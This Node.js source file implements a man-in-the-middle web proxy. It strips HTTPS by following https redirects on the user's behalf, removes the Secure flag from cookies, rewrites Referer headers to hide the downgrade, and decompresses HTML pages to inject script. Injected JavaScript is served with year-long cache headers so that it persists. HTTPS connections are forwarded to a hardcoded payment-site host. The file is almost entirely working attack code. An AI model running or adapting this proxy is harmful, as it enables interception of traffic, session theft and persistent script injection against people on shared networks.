'use strict';

var config = require('./config.json'),
	inject = require('./inject.js'),
	net = require('net'),
	http = require('http'),
	https = require('https'),
	zlib = require('zlib');


var https_url = {};



/**
 * 处理代理响应
 */
function proxyResponse(clientReq, clientRes, serverRes) {
	//
	// 检测是否重定向到https站点
	//
	if (serverRes.statusCode == 302) {
		var newUrl = serverRes.headers['location'] || '';

		if (/^https:\/\//i.test(newUrl)) {
			// “https://” 后面部分
			var url = newUrl.substr(8);
			https_url[url] = true;

			var pos = newUrl.indexOf('/', 8);
			clientReq.url = newUrl.substr(pos);
			clientReq.headers['host'] = newUrl.substring(8, pos);

			//
			// 直接返回给用户重定向后的https页面内容
			//   重复利用这个clientReq，再请求一次
			//
			proxyRequest(clientReq, clientRes);
			clientReq.emit('end');

			console.warn('[WEB] `%s` goto `%s`',
				clientReq.headers['host'] + clientReq.url,
				newUrl
			);
			return;
		}
	}


	var resHeader = serverRes.headers;

	//
	// 过滤cookie的Secure标记
	//
	var cookie = resHeader['set-cookie'] || [];
	for(var i = cookie.length - 1; i >= 0; --i) {
		cookie[i] = cookie[i].replace('; Secure', '');
	}

	//
	// 不是html文件直接管道转发。
	//
	//   很多网站使用gzip+chunk传输网页，并且使用gbk编码，
	//   因此必须全部接收完才能注入。
	//
	var content_type = resHeader['content-type'] || '';
	var mime = content_type.split(';')[0];

	if (mime != 'text/html') {
		clientRes.writeHead(serverRes.statusCode, resHeader);
		serverRes.pipe(clientRes);
		return;
	}

	//
	// gzip数据解压
	//
	var svrEnc = resHeader['content-encoding'];
	var stream = serverRes;

	if (svrEnc) {
		if (/gzip/i.test(svrEnc)) {
			stream = serverRes.pipe( zlib.createGunzip() );
		}
		else if (/deflate/i.test(svrEnc)) {
			stream = serverRes.pipe( zlib.createInflate() );
		}
	}

	//
	// 接收数据块到缓冲区
	//
	var data = new Buffer(0);

	stream.on('data', function(chunk) {
		data = Buffer.concat([data, chunk]);
	});

	stream.on('end', function() {
		if (data.length == 0) {
			flush();
			return;
		}

		//
		// 整个网页接收完成，注入！
		//
		var charset = content_type.split('charset=')[1];
		data = inject.injectHtml(data, charset);

		//
		// 返回注入后的网页（尽可能压缩）
		//
		var usrEnc = clientReq.headers['accept-encoding'];
		if (usrEnc) {
			if (/gzip/i.test(usrEnc)) {
				usrEnc = zlib.gzip;
				resHeader['content-encoding'] = 'gzip';
			}
			else if (/deflate/i.test(usrEnc)) {
				usrEnc = zlib.deflate;
				resHeader['content-encoding'] = 'deflate';
			}
			else {
				delete resHeader['content-encoding'];
			}
		}

		if (usrEnc) {
			usrEnc(data, function(err, bin) {
				err? BadReq() : flush(bin);
			});
		}
		else {
			flush(data);
		}

		function flush(data) {
			if (data && data.length > 0) {
				resHeader['content-length'] = data.length;
			}
			clientRes.writeHead(serverRes.statusCode, resHeader);
			clientRes.end(data);
		}
	});

	stream.on('error', function() {
		console.log('================================= zlib error ======');
		BadReq();
	});

	function BadReq() {
		clientRes.writeHeader(404);
		clientRes.end();
	}
}


/**
 * 发起代理请求
 */
function proxyRequest(clientReq, clientRes) {

	var reqHeader = clientReq.headers;
	var host = reqHeader['host'];
	var url = host + clientReq.url;
	var fromHttpsPage;

	var referer = reqHeader['referer'];
	if (referer) {
		//
		// 防止referer暴露来源页，替换http://为https://
		//
		var refUrl = referer.split('//')[1];

		fromHttpsPage = https_url[refUrl];
		if (fromHttpsPage) {
			referer = 'https://' + refUrl;
		}
	}

	//
	// 目标url在https列表中，
	//    则用https代理访问。
	// 如果资源的引用页在https列表中，
	//    则有可能是引用页中的相对路径（相对路径没法分析是https还是http的），
	//    也使用用https代理该资源（一般https页面的资源基本都是https的）。
	//
	var secure = https_url[url] || fromHttpsPage;

	var fullUrl = (secure? 'https://' : 'http://') + url;

	console.log('[WEB] %s\t%s %s',
		clientReq.connection.remoteAddress,
		clientReq.method,
		fullUrl
	);

	// 代理请求参数
	var request = secure? https.request : http.request;
	var options = {
		hostname: host,
		port: secure? 443 : 80,
		path: clientReq.url,
		method: clientReq.method,
		headers: reqHeader
	};

	var proxy = request(options, function(serverRes) {
		proxyResponse(clientReq, clientRes, serverRes);
	});

	proxy.on('error', function() {
		console.error('[WEB] Error', fullUrl);
		//console.log(reqHeader);
		clientRes.writeHeader(404);
		clientRes.end();
	});

	clientReq.pipe(proxy);
}


/**
 * 客户端HTTP请求
 */
function onHttpRequest(clientReq, clientRes) {
	var host = clientReq.headers['host'];
	if (!host) {
		return;
	}

	//
	// inject code
	//
	var url = clientReq.headers['host'] + clientReq.url;
	var js = inject.injectJs(url);
	if (js) {
		var data = new Buffer(js),
			sec = config.debug? 1 : 365 * 24 * 3600,
			exp = new Date(Date.now() + sec * 1000),
			now = new Date().toGMTString();


		clientRes.writeHead(200, {
			'Content-Type': 'text/javascript',
			'Content-Length': data.length,

			'Cache-Control': 'max-age=' + sec,
			'Expires': exp.toGMTString(),
			'Date': now,
			'Last-Modified': now
		});
		clientRes.end(data);
	}
	else {
		proxyRequest(clientReq, clientRes);
	}
}



/**
 * 客户端HTTPS请求
 */
function onHttpsRequest(usr) {
	usr.once('data', function(data) {
		// 分析host字段
		var host = 'i.alipayobjects.com';
		console.warn('[WEB] ssl request `%s`', host);

		var s = net.connect(443, host, function() {
			this.write(data);
			usr.pipe(this);
		});
	});
}


/**
 * 启动代理服务
 */
var svrHttp;
var svrHttps;

exports.start = function() {
	//
	// 开启http代理
	//
	var svrHttp = http.createServer(onHttpRequest);

	svrHttp.listen(80, function() {
		console.log("[WEB] listening %s:80", this.address().address);
	});

	svrHttp.on('error', function() {
		console.error('[WEB] fail listen TCP:80');
	});

	//
	// 开启https代理
	//
	var svrHttps = net.createServer(onHttpsRequest);

	svrHttps.listen(443, function() {
		console.log("[WEB] listening %s:443", this.address().address);
	});

	svrHttps.on('error', function() {
		console.error('[WEB] fail listen TCP:443');
	});
}

exports.stop = function() {
	svrHttp.close();
	svrHttps.destroy();
}

exports.addHttpsUrl = function(url) {
	if (url.indexOf('/') == -1) {
		url += '/';
	}
	https_url[url] = true;
}